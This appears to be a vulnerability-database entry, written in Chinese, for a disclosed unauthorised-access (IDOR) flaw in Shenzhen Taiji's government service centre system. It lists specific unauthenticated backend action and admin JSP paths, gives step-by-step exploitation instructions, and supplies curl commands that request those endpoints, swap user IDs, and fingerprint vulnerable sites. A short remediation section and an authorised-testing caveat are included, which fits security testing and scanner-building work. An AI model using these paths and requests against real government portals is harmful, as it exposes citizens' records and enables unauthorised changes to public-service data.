---
id: TAIJI-GOV-SERVICE-CENTER-IDOR
title: 深圳太极政府服务中心系统通用多处越权漏洞（wooyun-2014-066231）
product: taiji
vendor: 深圳太极软件有限公司（Shenzhen Taiji）
version_affected: "人民政府服务中心系统（wooyun-2014-066231 披露版本）"
severity: HIGH
tags: [idor, 越权访问, 逻辑漏洞, 国产, 政务, 政府服务中心]
fingerprint: ["深圳太极", "太极软件", "sztaiji", "政府服务中心", "政务服务中心"]
---

## 漏洞描述

深圳太极软件有限公司开发的"人民政府服务中心"系统存在通用多处越权漏洞（wooyun-2014-066231）。多个政府单位使用同一套系统，未授权/低权限用户可对业务数据执行增、删、改等越权操作，服务端缺少对象级与功能级授权校验。

**注意**：本条目只覆盖 wooyun-2014-066231（政府服务中心越权）；太极电子政务 Oracle 注入、Struts2 RCE 等漏洞各自独立编号，不要合并。

## 影响版本

- 人民政府服务中心系统（深圳太极软件，wooyun-2014-066231 披露版本）

## 前置条件

- 目标为深圳太极政府服务中心系统
- 需要一个普通账号（或存在未授权访问面）

## 利用步骤

1. 识别目标为深圳太极"人民政府服务中心"系统（登录页/厂商特征）
2. wooyun 原文（wooyun-2014-066231）确认多处功能无需登录即可访问，并披露以下未授权/越权入口：
   - `/tscz/backTsczAction_showList.action?type=1&isHuiFu=3`
   - `/tscz/backTsczAction_showList.action?type=2&isHuiFu=3`
   - `/tscz/tsczAction_backShowList.action?type=3&isHuiFu=3`
   - `/myddc/myddc_backIndex.action?currentPage=1`
   - `/spdt/spdt_backListDeptContent.action`
   - `/yhdl/yhdl_goChange.action`、`/menu/menuAction.action`、`/bgxz/bgxzAction_executeBack.action`
   - 后台页面：`/view/manager/left.jsp`、`/view/com/tjsoft/module/admin/admin.jsp`、`/view/com/tjsoft/module/bgxz/bgxz-index.jsp`
3. 未登录直接访问上述 action，确认可读取/操作业务数据；对带 ID 的接口替换 ID 验证对象级越权（原文收录关键字如 `zxjbAction_showInfo.action?wid=`）
4. 原文指出可恶意增删改，验证时避免执行破坏性操作

## Payload

```bash
# 未登录直接访问（wooyun 原文披露的入口，仅限授权测试）
curl -s "http://target/tscz/backTsczAction_showList.action?type=1&isHuiFu=3"
curl -s "http://target/tscz/tsczAction_backShowList.action?type=3&isHuiFu=3"
curl -s "http://target/myddc/myddc_backIndex.action?currentPage=1"
# 对象级越权探测：替换 wid/ID 参数观察是否可访问他人数据（路径按实际功能调整）
curl -s "http://target/<action>?wid=<其他用户ID>"
```

## 验证方法

1. 识别目标为政府服务中心系统（登录页/厂商特征）
2. 在授权范围内逐个测试增、删、改类业务接口，替换 ID 归属参数
3. 若低权限/未登录可操作他人或系统级数据，则存在越权

## 指纹确认

```bash
curl -s "http://target/" | grep -iE "太极|taiji|sztaiji|政务服务中心|政府服务中心"
```

## 修复建议

1. 联系厂商获取修复版本
2. 对所有写操作增加对象级授权校验
3. 对管理功能增加角色/权限控制

## 参考

- wooyun-2014-066231: https://wooyun.laolisafe.com/bug_detail.php?wybug_id=wooyun-2014-066231
